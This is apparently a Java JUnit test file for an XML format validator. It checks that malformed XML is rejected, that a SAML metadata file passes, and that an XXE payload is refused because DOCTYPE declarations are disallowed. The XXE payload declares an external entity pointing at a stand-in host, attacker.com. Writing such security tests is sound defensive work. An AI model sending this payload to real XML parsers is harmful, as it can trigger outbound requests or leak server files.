package manage.validations;

import manage.TestUtils;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

public class XMLFormatValidatorTest implements TestUtils {

    private XMLFormatValidator subject = new XMLFormatValidator();

    @Test
    public void validate() throws Exception {
        assertTrue(subject.validate("nope").isPresent());
        assertFalse(subject.validate(readFile("/xml/expected_metadata_export_saml20_sp.xml")).isPresent());
    }

    @Test
    public void validateWithXxe() {
        String xxe = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "  <!ELEMENT foo ANY >\n" +
                "  <!ENTITY xxe SYSTEM \"http://www.attacker.com/text.txt\" >]>\n" +
                "<foo>&xxe;</foo>";

        String result = subject.validate(xxe).orElse(null);

        assertNotNull(result);
        assertTrue(result.contains("DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true."));
    }

}